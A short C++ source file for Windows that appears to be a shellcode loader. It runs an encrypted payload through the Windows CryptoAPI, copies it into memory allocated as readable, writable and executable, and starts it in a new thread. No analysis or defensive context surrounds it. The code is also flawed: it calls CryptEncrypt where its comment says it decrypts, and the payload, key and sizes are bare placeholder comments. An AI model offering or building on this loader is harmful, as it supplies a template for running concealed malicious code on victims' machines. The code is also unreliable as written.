```c++
#include <windows.h>
#include <wincrypt.h>
#include <iostream>

void EncryptPayload(LPBYTE lpPayload, DWORD dwPayloadSize, LPBYTE lpKey, DWORD dwKeySize) {
    HCRYPTPROV hCryptProv;
    if (CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        HCRYPTKEY hKey;
        if (CryptImportKey(hCryptProv, lpKey, dwKeySize, 0, 0, &hKey)) {
            CryptEncrypt(hKey, NULL, TRUE, 0, lpPayload, &dwPayloadSize, dwPayloadSize);
            CryptDestroyKey(hKey);
        }
        CryptReleaseContext(hCryptProv, 0);
    }
}

void LoadAndExecutePayload(LPBYTE lpPayload, DWORD dwPayloadSize) {
    LPVOID lpBaseAddress = VirtualAlloc(NULL, dwPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpBaseAddress) {
        memcpy(lpBaseAddress, lpPayload, dwPayloadSize);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, NULL, 0, NULL);
    }
}

int main() {
    // Load and decrypt payload
    LPBYTE lpEncryptedPayload = /* encrypted payload */;
    DWORD dwEncryptedPayloadSize = /* size of encrypted payload */;
    LPBYTE lpKey = /* encryption key */;
    DWORD dwKeySize = /* size of encryption key */;
    EncryptPayload(lpEncryptedPayload, dwEncryptedPayloadSize, lpKey, dwKeySize);

    // Load and execute decrypted payload
    LoadAndExecutePayload(lpEncryptedPayload, dwEncryptedPayloadSize);

    return 0;
}
```

